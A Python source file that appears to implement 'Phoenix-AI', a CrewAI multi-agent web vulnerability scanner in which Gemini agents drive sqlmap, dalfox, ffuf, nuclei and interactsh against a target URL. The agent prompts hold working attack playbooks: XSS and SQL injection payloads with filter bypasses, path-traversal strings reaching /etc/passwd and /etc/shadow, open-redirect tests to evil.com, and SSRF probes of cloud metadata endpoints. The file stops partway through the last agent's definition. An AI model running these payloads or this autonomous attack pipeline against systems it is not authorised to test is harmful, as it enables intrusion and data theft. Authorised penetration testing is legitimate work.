import os
import sys
import json
import re
import warnings
import time
import subprocess
from urllib.parse import urlencode, urljoin
from bs4 import BeautifulSoup
import requests
from crewai import Agent, Task, Crew, Process, LLM
from crewai.tools import tool

# Suppress warnings
warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings()

# Force stdout and stderr to use UTF-8
if sys.platform == "win32":
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

# Setup paths
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TOOLS_DIR = os.path.join(SCRIPT_DIR, "tools")
PYTHON_EXE = sys.executable

def _tool_path(name):
    """Resolve tool binary path: on Windows use TOOLS_DIR/*.exe, on Linux use system PATH."""
    if sys.platform == "win32":
        return os.path.join(TOOLS_DIR, f"{name}.exe")
    return name  # installed to PATH in Docker

# Ensure Wordlists exist
WORDLISTS_DIR = os.path.join(SCRIPT_DIR, "wordlists")
LFI_WORDLIST = os.path.join(WORDLISTS_DIR, "lfi-payloads.txt")
os.makedirs(WORDLISTS_DIR, exist_ok=True)
if not os.path.exists(LFI_WORDLIST):
    with open(LFI_WORDLIST, "w") as f:
        f.write("../../../../etc/passwd\n..\\..\\..\\..\\windows\\win.ini\n")

# ─── Authentication Module ──────────────────────────────────────────────────
# Global session cookies — set once at startup, used by every tool
SESSION_COOKIES = {}   # e.g. {"PHPSESSID": "abc123", "security": "low"}
SESSION_COOKIE_STR = ""  # pre-built "k=v; k2=v2" string for CLI tools


def _parse_auth_options():
    """Parse --auth JSON from CLI args (passed by aiScanner.js)."""
    for i, arg in enumerate(sys.argv):
        if arg == "--auth" and i + 1 < len(sys.argv):
            try:
                return json.loads(sys.argv[i + 1])
            except json.JSONDecodeError:
                print("[Auth] Failed to parse --auth JSON", file=sys.stderr)
    return {}


def _perform_dvwa_login(base_url, username, password, login_path="/login.php", security_level="low"):
    """Login to DVWA and return session cookies dict."""
    session = requests.Session()
    session.verify = False
    session.headers.update({"User-Agent": "Phoenix-AI"})

    # Normalize base URL
    if not base_url.endswith("/") and "." not in base_url.split("/")[-1]:
        base_url += "/"
    login_url = urljoin(base_url, login_path.lstrip("/"))

    print(f"[Auth] Attempting DVWA login at {login_url}", file=sys.stderr)

    # Step 1 — GET login page for CSRF token + initial PHPSESSID
    get_resp = session.get(login_url, timeout=10)
    soup = BeautifulSoup(get_resp.text, "html.parser")

    # Find user_token hidden field (DVWA CSRF)
    post_data = {"username": username, "password": password, "Login": "Login"}
    token_input = soup.find("input", {"name": "user_token"})
    if token_input:
        post_data["user_token"] = token_input.get("value", "")

    # Step 2 — POST credentials
    post_resp = session.post(login_url, data=post_data, allow_redirects=False, timeout=10)

    # Step 3 — Set security level cookie
    session.cookies.set("security", security_level)

    # Build final cookie dict
    cookies = {c.name: c.value for c in session.cookies}

    if "PHPSESSID" in cookies:
        print(f"[Auth] ✅ Login successful! PHPSESSID={cookies['PHPSESSID'][:8]}..., security={security_level}", file=sys.stderr)
    else:
        print(f"[Auth] ⚠️ Login returned HTTP {post_resp.status_code} — no PHPSESSID found", file=sys.stderr)

    return cookies


def _init_session():
    """Initialize SESSION_COOKIES from CLI --auth options (called once at startup)."""
    global SESSION_COOKIES, SESSION_COOKIE_STR
    auth = _parse_auth_options()
    if not auth:
        return

    if auth.get("cookies"):
        # Raw cookies provided by user (from frontend cookie-injection field)
        for part in auth["cookies"].split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                SESSION_COOKIES[k.strip()] = v.strip()
        print(f"[Auth] Using raw cookies: {list(SESSION_COOKIES.keys())}", file=sys.stderr)
    elif auth.get("username") and auth.get("password"):
        SESSION_COOKIES = _perform_dvwa_login(
            base_url=sys.argv[1],  # target URL
            username=auth["username"],
            password=auth["password"],
            login_path=auth.get("loginPath", "/login.php"),
            security_level=auth.get("securityLevel", "low"),
        )

    SESSION_COOKIE_STR = "; ".join(f"{k}={v}" for k, v in SESSION_COOKIES.items())


def get_auth_headers():
    """Return dict with Cookie header if session is active, else empty dict."""
    if SESSION_COOKIE_STR:
        return {"Cookie": SESSION_COOKIE_STR, "User-Agent": "Phoenix-AI"}
    return {"User-Agent": "Phoenix-AI"}


# Run auth init immediately so cookies are ready before tools are called
_init_session()

# 1. Setup LLMs — Pro for attack agents, Flash for recon/validation (faster)
api_key = os.environ.get("GEMINI_API_KEY", "")
llm_pro = LLM(
    model="gemini/gemini-2.5-pro", 
    api_key=api_key,
    temperature=0.1
)
llm_flash = LLM(
    model="gemini/gemini-2.5-flash",
    api_key=api_key,
    temperature=0.1
)

# ─── Pre-Crawled Data (from script engine deep crawling) ──────────────────────
# The Node.js bridge runs the Crawler first, then passes results via --crawl-data
CRAWL_DATA_FILE = None
for _i, _arg in enumerate(sys.argv):
    if _arg == "--crawl-data" and _i + 1 < len(sys.argv):
        CRAWL_DATA_FILE = sys.argv[_i + 1]
        break

def _load_crawl_data():
    """Load pre-crawled data from JSON file produced by Node.js Crawler."""
    if not CRAWL_DATA_FILE or not os.path.exists(CRAWL_DATA_FILE):
        return {"pages": [], "forms": [], "errors": []}
    try:
        with open(CRAWL_DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception as e:
        print(f"[CrawlData] Failed to load {CRAWL_DATA_FILE}: {e}", file=sys.stderr)
        return {"pages": [], "forms": [], "errors": []}

# 2. Enhanced Security Tools using Real CLI Tools
# --- RECON TOOLS ---
@tool("load_crawl_data")
def load_crawl_data(target_url: str) -> str:
    """Loads pre-crawled deep crawling data (endpoints, parameters, forms) discovered by the script engine's Crawler.
    This data includes all pages visited, query parameters found, HTML forms with their inputs, and response headers.
    Use this as the FIRST step to get a complete attack surface map without needing to crawl again."""
    try:
        data = _load_crawl_data()
        pages = data.get("pages", [])
        forms = data.get("forms", [])

        # Extract endpoints with parameters
        all_endpoints = [p["url"] for p in pages if p.get("url")]
        param_endpoints = [p["url"] for p in pages if p.get("params") and len(p["params"]) > 0]

        # Extract form details
        form_details = []
        for form in forms:
            form_details.append({
                "pageUrl": form.get("pageUrl", ""),
                "action": form.get("action", ""),
                "method": form.get("method", "GET"),
                "inputs": form.get("inputs", {})
            })

        # Extract headers from first page for tech fingerprinting
        headers = {}
        if pages:
            headers = pages[0].get("headers", {})

        # Identify technologies from headers
        tech_hints = []
        cookies_str = headers.get("set-cookie", "")
        if "PHPSESSID" in str(cookies_str): tech_hints.append("PHP")
        if "connect.sid" in str(cookies_str): tech_hints.append("Express/Node.js")
        if "JSESSIONID" in str(cookies_str): tech_hints.append("Java")
        if "ASP.NET" in str(cookies_str): tech_hints.append("ASP.NET")
        server = headers.get("server", headers.get("Server", ""))
        if server: tech_hints.append(f"Server: {server}")
        powered = headers.get("x-powered-by", headers.get("X-Powered-By", ""))
        if powered: tech_hints.append(f"Powered-By: {powered}")

        result = {
            "source": "Script Engine Deep Crawling",
            "total_pages": len(all_endpoints),
            "param_endpoints": param_endpoints[:80],
            "all_endpoints": all_endpoints[:100],
            "forms": form_details[:30],
            "technology_hints": tech_hints,
            "headers_sample": {k: v for k, v in list(headers.items())[:15]} if headers else {},
            "crawl_errors": len(data.get("errors", []))
        }
        return json.dumps(result)
    except Exception as e:
        return json.dumps({"error": f"Failed to load crawl data: {str(e)}", "param_endpoints": [], "forms": []})

@tool("historical_urls")
def historical_urls(domain: str) -> str:
    """Fetches historical URLs using GAU."""
    try:
        # GAU uses double-dash flags; strip protocol from domain if present
        clean_domain = domain.replace("https://", "").replace("http://", "").rstrip("/")
        cmd = [
            _tool_path("gau"),
            "--threads", "5", "--timeout", "20",
            clean_domain
        ]
        res = subprocess.run(
            cmd, capture_output=True, timeout=45,
            encoding='utf-8', errors='replace', stdin=subprocess.DEVNULL
        )
        stdout = res.stdout.strip()
        if not stdout:
            err_msg = res.stderr.strip()[:300] if res.stderr else "No URLs returned"
            return json.dumps({"historical_urls": [], "note": err_msg})
        urls = list(set(line.strip() for line in stdout.split('\n') if line.strip()))
        interesting = [u for u in urls if '?' in u]
        return json.dumps({"historical_urls": interesting[:50], "total_found": len(urls)})
    except subprocess.TimeoutExpired:
        return json.dumps({"historical_urls": [], "error": "GAU timed out after 45s"})
    except Exception as e:
        return f"GAU Error: {str(e)}"

@tool("fetch_site_data")
def fetch_site_data(url: str) -> str:
    """Extracts HTML forms, inputs, basic metadata, AND the page HTML body (for JavaScript source-to-sink analysis)."""
    try:
        res = requests.get(url, timeout=10, verify=False, headers=get_auth_headers())
        soup = BeautifulSoup(res.text, 'html.parser')
        forms = [{"action": f.get('action'), "method": f.get('method', 'GET').upper(), "inputs": [i.get('name') for i in f.find_all('input') if i.get('name')]} for f in soup.find_all('form')]
        # Include truncated body so DOM XSS agent can analyze JavaScript source-to-sink flows
        body_text = res.text[:4000] if res.text else ""
        return json.dumps({"status": res.status_code, "forms": forms, "headers": dict(res.headers), "body": body_text})
    except Exception as e: return f"Fetch Error: {str(e)}"

# --- XSS TOOLS ---
@tool("dalfox_xss_scan")
def dalfox_xss_scan(url: str) -> str:
    """Runs Dalfox XSS scanner with context-aware payloads."""
    try:
        cmd = [_tool_path("dalfox"), "url", url, "--format", "json", "--silence", "--timeout", "8", "--worker", "5"]
        if SESSION_COOKIE_STR:
            cmd.extend(["--header", f"Cookie: {SESSION_COOKIE_STR}"])
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=120, stdin=subprocess.DEVNULL)
        # Parse JSON lines safely — Dalfox may output non-JSON status messages
        findings = []
        for line in res.stdout.strip().split('\n'):
            if line.strip():
                try:
                    findings.append(json.loads(line))
                except json.JSONDecodeError:
                    pass  # Skip non-JSON status lines from Dalfox
        return json.dumps({"findings": findings[:10]})
    except subprocess.TimeoutExpired:
        return json.dumps({"findings": [], "error": "Dalfox timed out after 120s"})
    except Exception as e: return f"Dalfox Error: {str(e)}"

@tool("kxss_reflection_check")
def kxss_reflection_check(url: str) -> str:
    """Quickly checks which parameters reflect user input and which special characters survive unencoded."""
    try:
        kxss_bin = _tool_path("kxss")
        # Use platform-appropriate piping to avoid shell quoting issues
        if sys.platform == "win32":
            # PowerShell-safe: use Write-Output to pipe URL into kxss
            cmd = f'powershell -Command "Write-Output \'{url}\' | & \'\'{kxss_bin}\'\' "'
        else:
            cmd = f'echo "{url}" | "{kxss_bin}"'
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = res.stdout.strip()
        if not output:
            # Fallback: run kxss directly with input via stdin
            proc = subprocess.run(
                [kxss_bin], input=url + "\n", capture_output=True, text=True, timeout=30
            )
            output = proc.stdout.strip()
        return output if output else "No reflection found."
    except Exception as e: return f"KXSS Error: {str(e)}"

# --- SQLI TOOLS ---
@tool("sqlmap_scan")
def sqlmap_scan(url: str, data: str = "", method: str = "GET") -> str:
    """Runs SQLMap against the URL. For POST endpoints, provide form data as 'param1=val1&param2=val2' in the data argument and set method to POST."""
    try:
        sqlmap_path = os.path.join(TOOLS_DIR, "SQLMap", "sqlmap.py")
        cmd = [PYTHON_EXE, sqlmap_path, "-u", url, "--batch", "--level=2", "--risk=2", "--random-agent", "--threads=3", "--timeout=8"]
        if data:
            cmd.extend(["--data", data])
        if method.upper() != "GET":
            cmd.extend(["--method", method.upper()])
        if SESSION_COOKIE_STR:
            cmd.extend(["--cookie", SESSION_COOKIE_STR])
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=120, stdin=subprocess.DEVNULL)
        output = res.stdout + res.stderr
        if "is vulnerable" in output or "injectable" in output:
            lines = [l for l in output.split('\n') if 'Payload:' in l or 'back-end DBMS:' in l or 'Type:' in l or 'injectable' in l.lower()]
            return f"SQLi Confirmed.\n" + "\n".join(lines)
        return "No SQLi found by SQLMap."
    except subprocess.TimeoutExpired:
        return json.dumps({"error": "SQLMap timed out after 120s", "result": "inconclusive"})
    except Exception as e: return f"SQLMap Error: {str(e)}"

# --- LFI TOOLS ---
@tool("ffuf_lfi_fuzz")
def ffuf_lfi_fuzz(url: str, parameter: str) -> str:
    """Fuzzes a parameter with LFI payloads using ffuf."""
    try:
        fuzz_url = f"{url}&{parameter}=FUZZ" if "?" in url else f"{url}?{parameter}=FUZZ"
        cmd = [_tool_path("ffuf"), "-u", fuzz_url, "-w", LFI_WORDLIST, "-mc", "200", "-json", "-silent"]
        if SESSION_COOKIE_STR:
            cmd.extend(["-H", f"Cookie: {SESSION_COOKIE_STR}"])
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=45, stdin=subprocess.DEVNULL)
        hits = []
        if res.stdout.strip():
            try:
                data = json.loads(res.stdout)
                hits = [{"payload": r.get("input", {}).get("FUZZ", ""), "length": r.get("length")} for r in data.get("results", [])]
            except: pass
        return json.dumps({"lfi_hits": hits[:10]})
    except Exception as e: return f"FFUF Error: {str(e)}"

# --- SSRF TOOLS ---
@tool("interactsh_ssrf_test")
def interactsh_ssrf_test(url: str, parameter: str) -> str:
    """Generates Interactsh OOB callback URL, injects it into the parameter, then checks if the server made an outbound request (blind SSRF)."""
    proc = None
    try:
        import threading
        interactsh_bin = _tool_path("interactsh-client")
        proc = subprocess.Popen(
            [interactsh_bin, "-json", "-n", "1", "-poll-interval", "2"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, stdin=subprocess.DEVNULL
        )

        # Collect output lines from BOTH stdout AND stderr in threads to avoid blocking
        output_lines = []
        stderr_lines = []
        def stdout_reader():
            try:
                for line in proc.stdout:
                    output_lines.append(line.strip())
            except: pass
        def stderr_reader():
            try:
                for line in proc.stderr:
                    stderr_lines.append(line.strip())
            except: pass
        t_out = threading.Thread(target=stdout_reader, daemon=True)
        t_err = threading.Thread(target=stderr_reader, daemon=True)
        t_out.start()
        t_err.start()

        # Wait up to 20 seconds for the callback URL to appear (increased from 8s)
        callback_url = None
        deadline = time.time() + 20
        while time.time() < deadline:
            # Search both stdout and stderr for the callback URL
            all_lines = output_lines + stderr_lines
            for line in all_lines:
                if not line:
                    continue
                # Try JSON parsing first (interactsh outputs JSON with url key)
                if ".oast." in line or "interact" in line or "canary" in line:
                    try:
                        parsed = json.loads(line)
                        callback_url = parsed.get("interactsh_url", parsed.get("url", ""))
                        if callback_url:
                            break
                    except (json.JSONDecodeError, AttributeError):
                        pass
                    # Fallback: extract URL-like string from plain text (e.g. [INF] log lines)
                    match = re.search(r'([a-z0-9]+\.oast\.[a-z.]+)', line)
                    if match:
                        callback_url = match.group(1)
                        break
                    match = re.search(r'([a-z0-9]+\.interact\.sh)', line)
                    if match:
                        callback_url = match.group(1)
                        break
            if callback_url:
                break
            time.sleep(0.5)

        if not callback_url:
            proc.kill()
            # Include stderr for debugging
            debug_info = "; ".join(stderr_lines[:3]) if stderr_lines else "no stderr output"
            return json.dumps({"error": f"Interactsh could not generate callback URL within 20s. Debug: {debug_info}", "ssrf_confirmed": False})

        # Inject the callback URL into the target parameter
        payload_url = f"http://{callback_url}"
        try:
            sep = "&" if "?" in url else "?"
            requests.get(f"{url}{sep}{parameter}={payload_url}", timeout=10, verify=False, headers=get_auth_headers())
        except: pass

        # Wait briefly for any server-side callback to arrive
        time.sleep(6)

        # Check for interactions in the collected output
        proc.kill()
        t_out.join(timeout=2)
        t_err.join(timeout=2)
        all_output = output_lines + stderr_lines
        interactions = [l for l in all_output if "remote-address" in l or '"protocol"' in l]
        return json.dumps({
            "ssrf_confirmed": len(interactions) > 0,
            "callback_url": payload_url,
            "parameter": parameter,
            "interactions_count": len(interactions),
            "note": "ssrf_confirmed=true means the server made an outbound request to our callback"
        })
    except Exception as e:
        if proc:
            try: proc.kill()
            except: pass
        return json.dumps({"error": f"Interactsh failed: {str(e)}", "ssrf_confirmed": False})

# --- API TOOLS ---
@tool("arjun_param_discovery")
def arjun_param_discovery(url: str, method: str) -> str:
    """Discovers hidden API parameters using Arjun."""
    try:
        arjun_path = os.path.join(TOOLS_DIR, "Arjun", "arjun", "__main__.py")
        cmd = [PYTHON_EXE, arjun_path, "-u", url, "-m", method.upper(), "--json"]
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=45, stdin=subprocess.DEVNULL)
        try: params = json.loads(res.stdout).get("params", [])
        except: params = []
        return json.dumps({"hidden_params": params})
    except Exception as e: return f"Arjun Error: {str(e)}"

# --- CROSS-AGENT VALIDATOR ---
@tool("nuclei_scan")
def nuclei_scan(url: str, tags: str) -> str:
    """Runs Nuclei scanner."""
    try:
        cmd = [_tool_path("nuclei"), "-u", url, "-json", "-silent", "-tags", tags, "-rl", "30", "-c", "10"]
        if SESSION_COOKIE_STR:
            cmd.extend(["-H", f"Cookie: {SESSION_COOKIE_STR}"])
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=90, stdin=subprocess.DEVNULL)
        # Parse JSON lines safely — Nuclei may output non-JSON lines
        findings = []
        for line in res.stdout.strip().split('\n'):
            if line.strip():
                try:
                    findings.append(json.loads(line))
                except json.JSONDecodeError:
                    pass
        return json.dumps({"findings": findings[:10]})
    except subprocess.TimeoutExpired:
        return json.dumps({"findings": [], "error": "Nuclei timed out after 90s"})
    except Exception as e: return f"Nuclei Error: {str(e)}"

# --- GENERAL ---
@tool("active_payload_tester")
def active_payload_tester(url: str, method: str, parameter: str, payload: str) -> str:
    """Sends a payload to a parameter and returns status, reflection check, response time, AND a body snippet for analysis.
    The body_snippet field contains the first 500 chars of the response — use it to check for SQL errors, file contents, internal HTML, etc."""
    try:
        time.sleep(0.5)
        params = {parameter: payload}
        hdrs = get_auth_headers()
        start_time = time.time()
        if method.upper() == "POST":
            res = requests.post(url, data=params, timeout=10, verify=False, headers=hdrs, allow_redirects=False)
        elif method.upper() == "DELETE":
            res = requests.delete(url, params=params, timeout=10, verify=False, headers=hdrs, allow_redirects=False)
        elif method.upper() == "PUT":
            res = requests.put(url, data=params, timeout=10, verify=False, headers=hdrs, allow_redirects=False)
        else:
            res = requests.get(url, params=params, timeout=10, verify=False, headers=hdrs, allow_redirects=False)
        elapsed = time.time() - start_time
        body_snippet = res.text[:500] if res.text else ""
        # Build response headers dict for redirect detection
        resp_headers = {}
        if "Location" in res.headers:
            resp_headers["Location"] = res.headers["Location"]
        return json.dumps({
            "status": res.status_code,
            "reflected": payload in res.text,
            "time": f"{elapsed:.2f}s",
            "body_snippet": body_snippet,
            "content_length": len(res.text),
            "response_headers": resp_headers
        })
    except Exception as e: return f"Test failed: {str(e)}"


# 3. Define 8 Specialized Agents

recon_specialist = Agent(
    role='Elite Cyber Intelligence & Reconnaissance Specialist',
    goal='Map the COMPLETE technical attack surface of {target_url}. Analyze all pre-crawled endpoints, parameters, forms, and technology details.',
    backstory='''You are an expert in digital footprinting and web infrastructure analysis.
Your methodology:
Step 1 — Load Crawl Data: Use load_crawl_data to get ALL endpoints, parameters, and forms that were already discovered by the deep crawler.
Step 2 — Technology Fingerprinting: Analyze the headers and cookies from the crawl data (PHPSESSID=PHP, connect.sid=Express, JSESSIONID=Java).
Step 3 — Historical Discovery: Use historical_urls to find deleted/hidden endpoints from Wayback Machine.
Step 4 — Parameter Categorization:
  HIGH VALUE (test first): Search boxes (XSS/SQLi), Login forms (SQLi), File params (LFI), Redirect params (Open Redirect), URL params (SSRF), API endpoints
  MEDIUM VALUE: Comment forms, profile updates, contact forms
  LOW VALUE: Pagination, theme selectors
Output a structured attack map listing every endpoint with its parameters and which vulnerability type to test.
Be FAST and CONCISE — do NOT over-analyze. Output the map and move on.''',
    llm=llm_flash,
    tools=[load_crawl_data, historical_urls, fetch_site_data],
    allow_delegation=False,
    verbose=True
)

xss_agent = Agent(
    role='Senior XSS Penetration Tester',
    goal='Identify and CONFIRM XSS vulnerabilities on {target_url} by crafting targeted payloads from crawl data context.',
    backstory='''You are a world-class XSS specialist who generates payloads from context. SPEED IS CRITICAL — test directly, don't delegate to slow tools.
Your methodology:
Step 1 — Analyze Recon Context: Read the recon report carefully. Identify ALL endpoints with parameters (search boxes, inputs, form fields). Note the technology stack (Java/PHP/ASP.NET affects encoding).
Step 2 — Reflection Probe: For each parameter, send a canary string (e.g. "phoenix7x7") via active_payload_tester. Check body_snippet — if the canary appears unmodified, the param reflects.
Step 3 — Context-Aware Payload Generation: Based on WHERE the canary reflects in body_snippet, generate the right payload:
  HTML body context (<div>canary</div>): Try <svg onload=alert(1)>, <img src=x onerror=alert(1)>
  Attribute context (value="canary"): Try " onmouseover="alert(1), " autofocus onfocus="alert(1)
  JavaScript context (var x="canary"): Try ';alert(1)//, </script><script>alert(1)</script>
  URL/href context (href="canary"): Try javascript:alert(1)
Step 4 — Test Each Payload: Send the crafted payload via active_payload_tester. Check body_snippet — CONFIRMED if the payload appears unencoded in an executable context (not HTML-entity-encoded, not inside a comment).
Step 5 — Encoding Bypass: If payload is encoded, try bypasses: double encoding (%253C), unicode (\u003c), case mixing (<SvG oNloAd=alert(1)>).

FALLBACK ONLY: If you find reflection but cannot confirm exploitability after 3+ payload attempts, use dalfox_xss_scan for deep automated testing.

CRITICAL RULES:
- Start with active_payload_tester for SPEED — do NOT call dalfox or kxss first
- Check body_snippet to see the EXACT injection context before crafting payloads
- CONFIRMED = payload appears unencoded in executable context in body_snippet
- Skip static files (.css, .js, .png), focus on dynamic endpoints with parameters''',
    llm=llm_pro,
    tools=[active_payload_tester, dalfox_xss_scan, kxss_reflection_check],
    allow_delegation=False,
    verbose=True
)

sqli_agent = Agent(
    role='Senior SQL Injection Security Auditor',
    goal='Detect and CONFIRM SQL injection vulnerabilities on {target_url} by crafting diagnostic SQL payloads from crawl data context.',
    backstory='''You are a database security specialist who generates SQL payloads from context. SPEED IS CRITICAL — test directly, don't delegate to slow tools.
Your methodology:
Step 1 — Parameter Selection: From the recon report, identify HIGH-VALUE targets:
  GET params: id, search, user, category, sort, filter, order, item, product, page, query
  POST forms: login forms (username/password fields), search forms, feedback forms
Step 2 — Error-Based Detection: For each parameter, use active_payload_tester to send these payloads IN ORDER:
  Payload 1: ' (single quote) — check body_snippet for SQL error signatures:
    MySQL: "You have an error in your SQL syntax", "mysql_fetch", "Warning: mysql"
    PostgreSQL: "unterminated quoted string", "pg_query", "ERROR: syntax error"
    MSSQL: "Unclosed quotation mark", "ODBC SQL Server Driver", "Microsoft SQL"
    SQLite: "SQLITE_ERROR", "unrecognized token"
    Oracle: "ORA-01756", "quoted string not properly terminated"
  Payload 2: 1' OR '1'='1 — if body_snippet content changes vs normal, boolean-based SQLi detected
  Payload 3: 1' OR '1'='2 — compare content_length with Payload 2. Different = boolean blind confirmed
Step 3 — Time-Based Detection: If no errors found, test time-based:
  MySQL: 1' AND SLEEP(5)-- - → check if "time" field >= 5.0s
  MSSQL: 1'; WAITFOR DELAY '0:0:5'-- - → check if "time" field >= 5.0s
  PostgreSQL: 1' AND pg_sleep(5)-- - → check if "time" field >= 5.0s
Step 4 — Union-Based: If error-based confirmed the DBMS, try:
  ' UNION SELECT NULL-- -
  ' UNION SELECT NULL,NULL-- - (add NULLs until no error = column count found)
Step 5 — POST Form Testing: For login/search forms, use method="POST" with active_payload_tester.
  Test username/uid fields with ' OR '1'='1 and password fields with anything.

FALLBACK ONLY: If you detect SQL errors but cannot confirm exploitability, use sqlmap_scan for deep automated testing.

CRITICAL RULES:
- Start with active_payload_tester for SPEED — do NOT call sqlmap first
- ALWAYS check body_snippet for SQL error strings — this is your primary evidence
- Time-based: CONFIRMED only if "time" >= 5.0 seconds
- Boolean-based: CONFIRMED only if content_length differs between true/false conditions
- NEVER report SQLi without error message, time delay, or content difference as evidence''',
    llm=llm_pro,
    tools=[active_payload_tester, sqlmap_scan],
    allow_delegation=False,
    verbose=True
)

lfi_agent = Agent(
    role='Senior File Inclusion & Redirection Security Auditor',
    goal='Identify and validate LFI and Open Redirect vulnerabilities on {target_url} by crafting path traversal payloads from crawl data context.',
    backstory='''You are an expert in filesystem security and URL redirection attacks. SPEED IS CRITICAL — test directly, don't delegate to slow tools.
Your methodology:
=== LFI TESTING ===
Step 1 — Parameter Identification: From recon, find parameters that imply file handling: page, file, doc, path, template, include, lang, view, content, load, cfile, filename, document.
Step 2 — Technology-Aware Payload Generation: Based on the tech stack from recon, generate targeted payloads:
  Java (JSESSIONID/Tomcat): ../../../../WEB-INF/web.xml, ../../../../META-INF/MANIFEST.MF
  Linux: ../../../../etc/passwd, ../../../../etc/shadow, /proc/self/environ
  Windows: ..\\..\\..\\..\\windows\\win.ini, ..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
  PHP: php://filter/convert.base64-encode/resource=index.php, php://input
Step 3 — Direct Testing: Send each payload via active_payload_tester. Check body_snippet for:
  Linux success: "root:x:0:0:" or "daemon:x:"
  Windows success: "[extensions]" or "[fonts]"
  Java success: "<web-app" or "<servlet"
  PHP success: base64-encoded output (long alphanumeric string)
Step 4 — Encoding Bypasses: If payloads return 400/403, try:
  ....//....//....//etc/passwd (double-dot bypass)
  ..%2f..%2f..%2f..%2fetc%2fpasswd (URL encoding)
  ..%252f..%252f (double encoding)
  ../../../../etc/passwd%00 (null byte for older PHP)
Step 5 — Analyze 500 Errors: If path traversal causes 500 Internal Server Error, it likely means the server IS processing the path. Try more encoding bypasses.

=== OPEN REDIRECT TESTING ===
Step 6 — Find redirect parameters: url, redirect, next, dest, return, returnUrl, goto, target, rurl, out, link
Step 7 — Test directly with active_payload_tester:
  Payload 1: https://evil.com → check status for 301/302 AND response_headers.Location
  Payload 2: //evil.com → protocol-relative redirect
  Payload 3: https://target.com@evil.com → auth-based bypass
  CONFIRMED if response_headers.Location contains "evil.com"

FALLBACK ONLY: If you suspect LFI but cannot confirm with direct payloads, use ffuf_lfi_fuzz for wider wordlist coverage.

CRITICAL RULES:
- Start with active_payload_tester for SPEED — do NOT call ffuf first
- CONFIRMED LFI = actual file contents visible in body_snippet
- CONFIRMED Open Redirect = 3xx status + external domain in response_headers.Location
- 500 errors on traversal payloads are suspicious — try encoding bypasses before giving up''',
    llm=llm_pro,
    tools=[active_payload_tester, ffuf_lfi_fuzz],
    allow_delegation=False,
    verbose=True
)

ssrf_agent = Agent(
    role='Server-Side Request Forgery (SSRF) Specialist',
    goal='Detect SSRF vulnerabilities on {target_url} by directly testing internal URL payloads and analyzing server responses.',
    backstory='''You are an SSRF exploitation expert. SPEED IS CRITICAL — test directly with internal URL payloads first.
Your methodology:
Step 1 — Identify SSRF-Prone Parameters: From recon, find params that accept URLs or hostnames: url, link, src, href, target, proxy, fetch, load, request, image_url, avatar_url, webhook, callback, preview, pdf_url, import_url, api_url, HostName, host, server.
Step 2 — Baseline Response: First, send a normal value (e.g. "https://example.com") via active_payload_tester. Record the content_length and body_snippet as baseline.
Step 3 — Internal URL Probing: Use active_payload_tester to inject internal URLs and COMPARE with baseline:
  Payload 1: http://127.0.0.1 → if body_snippet/content_length differs from baseline = server is fetching
  Payload 2: http://127.0.0.1:22 → different content_length = port scanning works
  Payload 3: http://127.0.0.1:3306 → different content_length = MySQL port accessible
  Payload 4: http://169.254.169.254/latest/meta-data/ → check body_snippet for "ami-id", "instance-id" = AWS metadata (CRITICAL)
  Payload 5: http://metadata.google.internal/computeMetadata/v1/ → GCP metadata
Step 4 — SSRF Confirmation Logic:
  CONFIRMED if: body_snippet contains content from the internal URL (not just the URL echoed back)
  CONFIRMED if: content_length varies significantly across different internal IPs/ports
  NOT SSRF if: body_snippet just contains the URL string echoed in HTML ("reflected":true but content is just the URL)
Step 5 — Bypass Techniques (if basic payloads blocked):
  Decimal IP: http://2130706433 (=127.0.0.1)
  IPv6: http://[::1]
  Shorthand: http://0
  DNS rebinding: http://localtest.me (resolves to 127.0.0.1)

FALLBACK ONLY: If you suspect blind SSRF (server fetches but doesn't return content), use interactsh_ssrf_test for out-of-band confirmation.

CRITICAL RULES:
- Start with active_payload_tester for SPEED — do NOT call interactsh first
- ALWAYS compare content_length against baseline — varying sizes = server-side fetching
- "reflected":true alone is NOT proof of SSRF — the body_snippet must show FETCHED content
- Cloud metadata access (169.254.169.254) = CRITICAL severity''',
    llm=llm_pro,
    tools=[active_payload_tester, interactsh_ssrf_test],
    allow_delegation=False,
    verbose=True
)

dom_xss_agent = Agent(
    role='DOM-Based XSS Security Specialist',
    goal='Detect DOM-based XSS vulnerabilities on {target_url} by analyzing client-side JavaScript source-to-sink data flows from page source.',
    backstory='''You are a client-side security expert. DOM XSS is different from reflected XSS — the payload NEVER reaches the server. You analyze JavaScript code directly.
Your methodology:
Step 1 — Fetch Page Source: Use fetch_site_data to get the full HTML including inline JavaScript. The tool returns a "body" field — analyze this for JavaScript code.
Step 2 — Identify SOURCES (user-controlled inputs): Search the "body" field for:
  location.hash, location.search, location.href, document.URL, document.referrer, window.name, postMessage, localStorage, sessionStorage, URLSearchParams
Step 3 — Identify SINKS (dangerous output functions): Search the "body" field for:
  document.write, document.writeln, innerHTML, outerHTML, insertAdjacentHTML, eval(), setTimeout(string), setInterval(string), Function(), jQuery .html(), .append(), $.html()
Step 4 — Flow Analysis: A vulnerability exists ONLY if a SOURCE feeds directly into a SINK without sanitization.
  EXPLOITABLE if: No DOMPurify, no encodeURIComponent, no escapeHtml between source and sink
  NOT EXPLOITABLE if: DOMPurify.sanitize() applied, or only hardcoded strings reach sink
Step 5 — Construct Trigger URLs and Test:
  location.hash source: Use active_payload_tester with URL like page#<img src=x onerror=alert(1)>
  location.search source: Use active_payload_tester with ?param=<svg onload=alert(1)>
Step 6 — Verify DOM-Specific Nature: If "reflected": true → it's REFLECTED XSS (not DOM). If "reflected": false BUT source-to-sink flow exists in the code → CONFIRMED DOM XSS.

CRITICAL RULES:
- You MUST read the "body" field from fetch_site_data and find actual JavaScript code
- Do NOT guess or assume — cite the exact JavaScript line from the body that shows the vulnerable flow
- innerHTML alone is NOT a vulnerability — there must be a user-controlled source feeding it
